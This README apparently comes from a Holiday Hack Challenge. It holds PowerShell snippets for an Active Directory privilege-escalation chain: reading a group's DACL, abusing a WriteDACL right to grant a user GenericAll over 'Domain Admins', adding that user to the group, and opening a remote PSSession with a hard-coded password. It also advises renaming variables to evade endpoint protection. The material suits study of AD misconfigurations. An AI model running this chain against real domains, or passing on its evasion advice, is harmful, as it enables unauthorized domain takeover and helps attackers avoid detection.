# hhc21_powershell_snippets

These snippets show you how you can read and write to Active Directory group objects DACLs. This also demonstrates using PowerShell to add an account to a AD group.

**Note:** These code snippets (or similar) are used legitimately by many powershell apps and as such will likely not trip endpoint protections. However, if for some reason they do in the future, it will likely be due to signature matching of variable names which can be overcome by changing variable names around.

### You can read the DACL of an AD group object using:

``` powershell
# Can Use Powerview: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
# Or:
$ADSI = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=vulns,DC=local"
$ADSI.psbase.ObjectSecurity.GetAccessRules($true,$true,[Security.Principal.NTAccount])
# Or:
$ldapConnString = "LDAP://CN=Domain Admins,CN=Users,DC=vulns,DC=local"
$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
$domainDirEntry.get_ObjectSecurity().Access
```

### In the below example, the "GenericAll" permission for the "chrisd" user to the "Domain Admins" group if the user your running it under has the "WriteDACL" permission on the "Domain Admins" group.

``` powershell
Add-Type -AssemblyName System.DirectoryServices
$ldapConnString = "LDAP://CN=Domain Admins,CN=Users,DC=vulns,DC=local"
$username = "chrisd"
$nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
$propGUID = [guid]'00000000-0000-0000-0000-000000000000'
$IdentityReference = (New-Object System.Security.Principal.NTAccount("vulns.local\$username")).Translate([System.Security.Principal.SecurityIdentifier])
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, ([System.DirectoryServices.ActiveDirectoryRights] "GenericAll"), ([System.Security.AccessControl.AccessControlType] "Allow"), $propGUID, $inheritanceType, $nullGUID
$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
$secOptions = $domainDirEntry.get_Options()
$secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
$domainDirEntry.RefreshCache()
$domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)
$domainDirEntry.CommitChanges()
$domainDirEntry.dispose()
```

### After giving "GenericAll" permissions over the "Domain Admins" group, the below snippet would add the chrisjd account to the "Domain Admins" group:

``` powershell
Add-Type -AssemblyName System.DirectoryServices
$ldapConnString = "LDAP://CN=Domain Admins,CN=Users,DC=vulns,DC=local"
$username = "chrisd"
$password = "Password!@12"
$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $password
$user = New-Object System.Security.Principal.NTAccount("vulns.local\$username")
$sid=$user.Translate([System.Security.Principal.SecurityIdentifier])
$b=New-Object byte[] $sid.BinaryLength
$sid.GetBinaryForm($b,0)
$hexSID=[BitConverter]::ToString($b).Replace('-','')
$domainDirEntry.Add("LDAP://<SID=$hexSID>")
$domainDirEntry.CommitChanges()
$domainDirEntry.dispose()
```

### Added bonus, here is how you can `Enter-PSSession` into a remote computer:

``` powershell
$password = ConvertTo-SecureString "Password!@12" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ("vulns.local\chrisd", $password)
Enter-PSSession -ComputerName WIN-4JFNT305Q5J.vulns.local -Credential $creds -Authentication Negotiate
```
